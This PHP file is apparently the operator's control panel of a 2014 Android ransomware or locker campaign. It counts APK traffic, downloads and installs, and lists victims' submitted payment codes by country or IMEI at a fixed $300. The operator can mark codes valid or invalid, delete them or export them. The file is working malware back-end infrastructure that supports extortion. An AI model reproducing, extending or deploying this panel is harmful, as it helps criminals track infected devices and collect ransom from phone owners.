<?php

if(basename(__FILE__) == basename($_SERVER['SCRIPT_FILENAME'])) {
    die;
}

$downloads = mysql_fetch_array(mysql_query("select counter from rating_counter where id=1 limit 1"));
$launches = mysql_fetch_array(mysql_query("select counter from rating_counter where id=2 limit 1")); 
$traffic = mysql_fetch_array(mysql_query("select counter from rating_counter where id=3 limit 1")); 

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title>Android</title>
	<meta http-equiv="Content-Language" content="English" />
	<meta name="Robots" content="noindex,nofollow" />
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<link rel="stylesheet" type="text/css" href="data/style.css" media="screen" />
</head>
<body>




<div id="wrap">

<div id="subh">

	
<div id="atata">
<table cellpadding="1" cellspacing="0" border="0" align="center" class="bord">
<tr>
  <td>
	
    <table cellpadding="4" cellspacing="0" border="0">
      <tr>
        <td class="caption" colspan=3><a href="api.php?method=allview" style="color:green">refresh</a> :: <a href="api.php?method=clear" style="color:red">clear</a> :: <a href="api.php?method=logout" style="color:red">logout</a>
        </td>
      </tr>
    </table>	

  </td>
</tr>
</table>
<br>
</div>		
	

<div id="ololo">
<table cellpadding="1" cellspacing="0" border="0" align="center" class="bord">
<tr>
  <td>

<table cellpadding="1" cellspacing="1" border="0">
 
 <tr class="light">
  <td align="center" width="36%">Traffic</td>
  <td align="center" width="42%"><b><?php echo (@$traffic['counter'] ?: 0);?></b></td>
 </tr>

 <tr class="light">
  <td align="center" width="36%">Download APK</td>
  <td align="center" width="42%"><b><?php echo (@$downloads['counter'] ?: 0);?></b></td>
 </tr>
 
 <tr class="light">
  <td align="center" width="36%">Install APK</td>
  <td align="center" width="42%"><b><?php echo (@$launches['counter'] ?: 0);?></b></td>
 </tr>

 <tr class="light">
  <td align="center" width="36%">CTR D/I :: T/I</td>
  <td align="center" width="42%"><b>1:<?php echo @intval((@$downloads['counter'] ?: 0)/(@$launches['counter'] ?: 0));?></b> :: <b>1:<?php echo @intval((@$traffic['counter'] ?: 0)/(@$launches['counter'] ?: 0));?></b></td>
 </tr>
 
   </td>
 </tr>
</table>  	

  </td>
</tr>
</table>
<br>
</div>	
	
<table cellpadding="1" cellspacing="0" border="0" align="center" class="bord">
<tr>
  <td>
  

<table cellpadding="1" cellspacing="1" border="0" width="100%">
	<tr class="light2">
		<td width="15%" align="center">
          <b>id</b>
        </td>
		<td width="15%" align="center">
          <b>Date</b>
        </td>
		<td width="18%" align="center">
          <b>Code</b>
        </td>
        <td width="12%" align="center">
          <b>Country/IMEI</b>
        </td>
	<td width="8%" align="center">
          <b>Amount</b>
        </td>
        <td width="20%" align="center">
            <b>Action</b>
        </td>
	</tr>


    <?php
    
    $result = mysql_query("SET NAMES 'utf8' ") or die("");
    $query = "select * from rating_all";
    $result = mysql_query ($query) or die ("");
    while($data=mysql_fetch_assoc($result))
    {
    echo '<tr class="light">
	<td align="center">'.$data['id'].'</td>
    <td align="center">'.$data['date'].'</td>
    <td '.(($data['used']==1) ? 'style="color:green"' : '').'  align="center"><b>'.$data['code'].'</b></td>
    <td align="center">'.$data['country'].'</td>
    <td align="center">$300</td>
    <td align="center">
		<a href="api.php?&method=used&id='.$data['id'].'">'.(($data['used']==0) ? 'Valid' : 'Invalid').'</a> / 
        <a href="api.php?&method=alldel&id='.$data['id'].'">Delete</a>
    </td>
    </tr>';
    }
    ?>
  

   </td>
 </tr>
</table>  

  </td>
</tr>
</table>

<br />

<a target="_blank" href="?method=export">Export codes</a>

</div>
	
<div id="footer">
<div class="rside">&copy; Copyright 2014, <b>Android</b>
</div>

</div>

</div>
	
</body>
</html>